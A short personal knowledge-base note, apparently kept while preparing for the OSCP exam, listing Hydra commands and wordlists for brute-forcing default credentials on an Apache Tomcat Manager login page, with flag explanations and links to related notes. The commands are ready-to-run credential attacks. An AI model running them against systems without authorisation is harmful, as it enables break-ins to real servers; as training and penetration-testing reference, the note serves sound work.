# brute force default credentials tomcat
colon separated: /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt
-e nsr    try "n" null password, "s" login as pass and/or "r" reversed login
-s PORT   if the service is on a different default port, define it here
```bash
hydra -s 8080 -C /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt $IP http-get /manager/html
```

try more than just the default colon separated default creds from seclists.
```bash
hydra -L /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -P /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt http-get://$IP/manager/html
```

` zet/20221003150804/README.md `

# Related

- [20221014185851](/zet/20221014185851/README.md) kb file named kb/hacking/commands/hydra-default-credentials.md
- [20221009005402](/zet/20221009005402/README.md) preparing for the OSCP exam
- [20221003150803](/zet/20221003150803/README.md) brute force default credentials tomcat wfuzz
- [20221003150802](/zet/20221003150802/README.md) brute force default credentials tomcat metasploit
- ~/kb/hacking/commands/hydra-default-credentials.md
- [20221003150744](/zet/20221003150744/README.md) hydra brute force
- [20221017182053](/zet/20221017182053/README.md) hydra

Tags:

    #command #hacking #hydra 
